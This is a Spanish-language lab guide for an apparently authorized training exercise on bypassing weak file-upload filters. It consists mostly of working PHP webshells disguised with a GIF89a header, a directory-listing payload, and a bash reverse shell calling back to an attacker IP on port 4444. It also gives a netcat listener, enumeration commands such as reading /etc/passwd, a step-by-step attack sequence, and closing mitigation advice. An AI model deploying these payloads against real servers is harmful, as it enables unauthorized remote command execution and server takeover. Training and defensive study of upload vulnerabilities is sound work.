# Payloads PHP disfrazados para laboratorio controlado

> Uso exclusivo en un entorno de laboratorio propio, aislado y autorizado.
> Estos ejemplos forman parte de una práctica didáctica sobre subida de archivos, bypass de validaciones débiles, ejecución remota de comandos y post-explotación básica.

---

## Contexto

Durante la explotación de la funcionalidad de subida de archivos se identificó que la aplicación no permite subir ficheros con extensión `.php` de forma directa.

Sin embargo, el filtro de subida permite ficheros que aparentan ser imágenes GIF. Para aprovechar esta debilidad se utilizan ficheros híbridos o *polyglot*, que comienzan con la cabecera:

```text
GIF89a
```

seguida de código PHP.

De esta forma, el archivo puede superar validaciones débiles basadas en cabecera, extensión parcial o tipo MIME, pero seguir siendo interpretado como PHP si el servidor lo permite.

---

## Índice

1. Webshell clásica disfrazada
2. Webshell tipo panel disfrazada
3. File browser disfrazado
4. Terminal por URL disfrazada
5. Reverse shell disfrazada
6. Versiones PHP directas bloqueadas
7. Pruebas de ejecución
8. Recomendación de uso en el laboratorio
9. Mitigaciones recomendadas

---

## 1. Webshell clásica disfrazada

### Fichero

```text
terminal_url.gif.php
```

### Descripción

Webshell sencilla que permite ejecutar comandos del sistema mediante el parámetro `cmd`.

Aunque el fichero contiene código PHP, comienza con la cabecera `GIF89a` para simular una imagen GIF y probar si la aplicación realiza una validación débil del archivo subido.

### Código

```php
GIF89a
<?php
// terminal.php - SOLO PARA LABORATORIO CONTROLADO

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    echo "<h2>Comando ejecutado:</h2>";
    echo "<pre>" . htmlspecialchars($cmd) . "</pre>";

    echo "<h2>Resultado:</h2>";
    echo "<pre>";
    system($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Uso: terminal.php?cmd=whoami";
}
?>
```

### Ejemplo de uso

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=whoami
```

Otros comandos útiles:

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=id
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=pwd
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=ls+-la
```

### Resultado esperado

```text
www-data
```

o:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 2. Webshell tipo panel disfrazada

### Fichero

```text
web_shell_bonita.gif.php
```

### Descripción

Webshell con formulario HTML que permite introducir comandos desde el navegador de forma más cómoda.

Esta variante también incluye la cabecera `GIF89a` para simular un archivo de imagen.

### Código

```php
GIF89a
<?php
echo "<form method='GET'>";
echo "<input type='text' name='cmd'>";
echo "<input type='submit'>";
echo "</form>";

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

### Ejemplo de uso

Abrir en el navegador:

```text
http://<IP_SERVIDOR>:8080/uploads/web_shell_bonita.gif.php
```

Comandos de prueba:

```bash
whoami
id
pwd
ls -la
ip a
```

### Utilidad

Esta versión es útil para documentación y demostraciones, ya que permite mostrar de forma visual cómo se ejecutan comandos desde el servidor comprometido.

---

## 3. File browser disfrazado

### Fichero

```text
file_browser.gif.php
```

### Descripción

Payload que permite listar directorios del servidor desde el navegador.

Se utiliza para descubrir rutas internas, archivos de configuración, directorios interesantes y posibles copias de seguridad.

### Código

```php
GIF89a
<?php
$dir = $_GET['dir'] ?? '.';
$files = scandir($dir);

foreach ($files as $f) {
    echo "<a href='?dir=$f'>$f</a><br>";
}
?>
```

### Ejemplo de uso

```text
http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php
```

Listar una ruta concreta:

```text
http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php?dir=/var/www/html
```

Listar `/etc`:

```text
http://<IP_SERVIDOR>:8080/uploads/file_browser.gif.php?dir=/etc
```

### Utilidad

Permite identificar:

* rutas internas del servidor;
* archivos de configuración;
* directorios accesibles por el usuario `www-data`;
* posibles ficheros sensibles;
* estructura real de la aplicación web.

---

## 4. Terminal por URL disfrazada

### Fichero

```text
terminal_url.gif.php
```

### Descripción

Esta variante muestra en pantalla tanto el comando ejecutado como su resultado. Es útil para documentar evidencias en capturas de pantalla.

### Código

```php
GIF89a
<?php
// terminal.php - SOLO PARA LABORATORIO CONTROLADO

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    echo "<h2>Comando ejecutado:</h2>";
    echo "<pre>" . htmlspecialchars($cmd) . "</pre>";

    echo "<h2>Resultado:</h2>";
    echo "<pre>";
    system($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Uso: terminal.php?cmd=whoami";
}
?>
```

### Ejemplo de uso

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=id
```

Comandos recomendados para la fase de enumeración:

```text
whoami
id
pwd
hostname
ip a
ls -la
cat /etc/passwd
ls -la /shared
```

---

## 5. Reverse shell disfrazada

### Fichero

```text
shell.gif.php
```

### Descripción

Payload que inicia una reverse shell desde el servidor víctima hacia la máquina atacante.

También comienza con `GIF89a` para superar filtros débiles de subida.

### Código

```php
GIF89a
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.128/4444 0>&1'");
?>
```

### Preparar listener en Kali

```bash
nc -lvnp 4444
```

### Ejecutar el payload

```text
http://<IP_SERVIDOR>:8080/uploads/shell.gif.php
```

### Resultado esperado en Kali

```text
connect to [192.168.129.128] from [192.168.129.129]
www-data@servidor-victima:/var/www/html/uploads$
```

### Nota

La dirección IP del payload debe adaptarse a la IP real de la máquina atacante.

Por ejemplo, si Kali tiene la IP:

```text
192.168.66.100
```

el payload debería usar:

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.66.100/4444 0>&1'");
```

---

## 6. Versiones PHP directas bloqueadas

Durante las pruebas también se prepararon versiones `.php` directas. Estas no deberían ser aceptadas por la aplicación si el filtro de subida funciona correctamente.

Se mantienen como referencia para comparar el comportamiento entre:

```text
.php
```

y:

```text
.gif.php
```

---

### `shell.php`

Reverse shell PHP directa.

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.66.100/4444 0>&1'");
?>
```

Resultado esperado:

```text
Subida bloqueada por la aplicación
```

---

### `terminal_url.php`

Webshell por parámetro URL sin disfraz GIF.

```php
<?php
// terminal.php - SOLO PARA LABORATORIO CONTROLADO

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    echo "<h2>Comando ejecutado:</h2>";
    echo "<pre>" . htmlspecialchars($cmd) . "</pre>";

    echo "<h2>Resultado:</h2>";
    echo "<pre>";
    system($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Uso: terminal.php?cmd=whoami";
}
?>
```

Resultado esperado:

```text
Subida bloqueada por la aplicación
```

---

### `web_shell_bonita.php`

Webshell con formulario HTML sin disfraz GIF.

```php
<?php
echo "<form method='GET'>";
echo "<input type='text' name='cmd'>";
echo "<input type='submit'>";
echo "</form>";

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

Resultado esperado:

```text
Subida bloqueada por la aplicación
```

---

## 7. Pruebas de ejecución

Una vez subido correctamente un payload disfrazado, se comprueba si el servidor lo interpreta como PHP.

### Prueba 1: usuario del proceso web

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=whoami
```

Resultado esperado:

```text
www-data
```

---

### Prueba 2: identificador del usuario

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=id
```

Resultado esperado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Prueba 3: ruta actual

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=pwd
```

Resultado esperado:

```text
/var/www/html/uploads
```

---

### Prueba 4: enumeración de red

```text
http://<IP_SERVIDOR>:8080/uploads/terminal_url.gif.php?cmd=ip+a
```

Esta prueba permite identificar interfaces internas y posibles redes adicionales del laboratorio.

---

## 8. Progresión recomendada para el laboratorio

Una secuencia adecuada para el alumno sería:

```text
1. Intentar subir shell.php.
2. Comprobar que la aplicación bloquea ficheros .php.
3. Preparar una versión con cabecera GIF89a.
4. Subir terminal_url.gif.php.
5. Ejecutar whoami e id para confirmar RCE.
6. Usar file_browser.gif.php para enumerar rutas.
7. Leer rutas interesantes desde la webshell.
8. Lanzar shell.gif.php para obtener reverse shell.
9. Estabilizar la shell.
10. Continuar con la post-explotación.
```

---

## 9. Mitigaciones recomendadas

Para evitar este tipo de vulnerabilidades en un entorno real, se recomienda:

* aplicar una lista blanca estricta de extensiones permitidas;
* renombrar los archivos subidos;
* guardar los archivos fuera del webroot;
* impedir la ejecución de PHP en el directorio `/uploads`;
* validar el MIME real del archivo;
* verificar el contenido mediante librerías especializadas;
* no conservar nombres originales;
* aplicar permisos mínimos;
* deshabilitar funciones peligrosas como `system`, `exec`, `shell_exec` y `passthru`;
* registrar y monitorizar subidas sospechosas;
* separar el servidor de archivos del servidor de ejecución;
* usar cabeceras de descarga forzada para archivos subidos.

---

## Resumen de payloads utilizados

| Fichero                    | Tipo        | Estado esperado | Uso principal                    |
| -------------------------- | ----------- | --------------- | -------------------------------- |
| `shell.php`                | PHP directo | Bloqueado       | Reverse shell directa            |
| `shell.gif.php`            | GIF/PHP     | Permitido       | Reverse shell disfrazada         |
| `terminal_url.php`         | PHP directo | Bloqueado       | Ejecución de comandos por URL    |
| `terminal_url.gif.php`     | GIF/PHP     | Permitido       | Ejecución de comandos disfrazada |
| `web_shell_bonita.php`     | PHP directo | Bloqueado       | Panel web de comandos            |
| `web_shell_bonita.gif.php` | GIF/PHP     | Permitido       | Panel web disfrazado             |
| `file_browser.gif.php`     | GIF/PHP     | Permitido       | Enumeración de directorios       |

---

## Conclusión

La vulnerabilidad no se debe únicamente a permitir la subida de archivos, sino a permitir que un archivo subido pueda ser interpretado como código PHP dentro de un directorio accesible públicamente.

El uso de ficheros disfrazados con cabecera `GIF89a` demuestra que los filtros basados únicamente en extensión, cabecera o tipo MIME son insuficientes.

Esta fase permite al alumno comprender la importancia de validar correctamente los archivos subidos, separar almacenamiento y ejecución, y aplicar controles de permisos adecuados en aplicaciones web.
